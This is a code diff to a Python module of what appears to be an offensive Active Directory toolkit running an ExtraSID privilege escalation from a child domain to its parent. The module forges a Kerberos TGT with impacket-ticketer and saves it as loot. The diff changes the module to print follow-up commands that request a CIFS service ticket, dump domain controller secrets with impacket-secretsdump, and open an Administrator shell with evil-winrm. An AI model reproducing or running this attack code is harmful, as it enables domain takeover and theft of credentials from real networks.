@@ -6,10 +6,9 @@ import re
 import shutil
 from core.colors import red, green, yellow, blue
 from core.helpers import save_loot
-from rich import print
 
 def is_valid_sid(sid):
-    return bool(re.match(r"^S-\\d-\\d+(-\\d+){1,}$", sid))
+    return bool(re.match(r"^S-\d-\d+(-\d+){1,}$", sid))
 
 def run(session):
     print(blue("[*] Starting ExtraSID privilege escalation (child → parent)..."))
@@ -54,8 +53,8 @@ def run(session):
         print(red("[-] Invalid key type selection."))
         return
 
-    if not shutil.which("impacket-ticketer") or not shutil.which("impacket-getST"):
-        print(red("[-] Required tools not found: impacket-ticketer / getST"))
+    if not shutil.which("impacket-ticketer"):
+        print(red("[-] 'impacket-ticketer' not found in PATH."))
         return
 
     tgt_path = f"loot/{username}_extratgt.ccache"
@@ -88,39 +87,25 @@ def run(session):
         print(red(f"[-] TGT file {default_ccache} was not created."))
         return
 
-    # === Step 2: Request ST for CIFS SPN
+    # === Step 2: Print manual follow-up commands
     spn = f"CIFS/{parent_dc_fqdn}"
-    getst_cmd = [
-        "impacket-getST",
-        "-spn", spn,
-        "-k", "-no-pass",
-        f"{child_domain}/{username}",
-        "-debug"
-    ]
-
-    print(blue(f"[*] Requesting ST for SPN: {spn}"))
-    try:
-        subprocess.run(getst_cmd, check=True)
-    except subprocess.CalledProcessError as e:
-        print(red(f"[-] Service ticket request failed:\n{e}"))
-        return
-
-    # === Step 3: Save ST
     st_name = f"{username}@{spn.replace('/', '_')}@{parent_domain.upper()}.ccache"
     st_path = f"loot/{st_name}"
-    if os.path.exists(st_name):
-        shutil.move(st_name, st_path)
-        print(green(f"[+] ST saved to loot: {st_path}"))
-    else:
-        print(yellow("[!] ST file not found. You may need to locate it manually."))
 
-    # === Final Instructions
     print()
     print(green("[+] ExtraSID attack completed successfully."))
     print(yellow("[*] Run the following commands manually to access the parent domain:\n"))
+
+    print(yellow("# Set the ticket environment"))
+    print(yellow(f"export KRB5CCNAME='{os.path.abspath(tgt_path)}'"))
+
+    print(yellow("\n# Request a Service Ticket for CIFS (do NOT run automatically)"))
+    print(yellow(f"impacket-getST -spn {spn} -k -no-pass {child_domain}/{username} '"))
+
+    print(yellow("\n# Use the ST with these commands after getST:"))
     print(yellow(f"export KRB5CCNAME='{os.path.abspath(st_path)}'"))
-    print(yellow(f"smbclient.py -k -no-pass //{parent_dc_fqdn}/C$"))
+    print(yellow(f"impacket-secretsdump -k -no-pass {parent_dc_fqdn}"))
+    print(yellow(f"evil-winrm -k -no-pass -r {parent_dc_fqdn} -u Administrator -d {parent_domain.upper()}"))
     print()
 
     save_loot("extrasid.log", f"Child SID: {child_sid}\nParent SID: {parent_sid}\nSPN: {spn}\nTGT: {tgt_path}\nST: {st_path}")
-
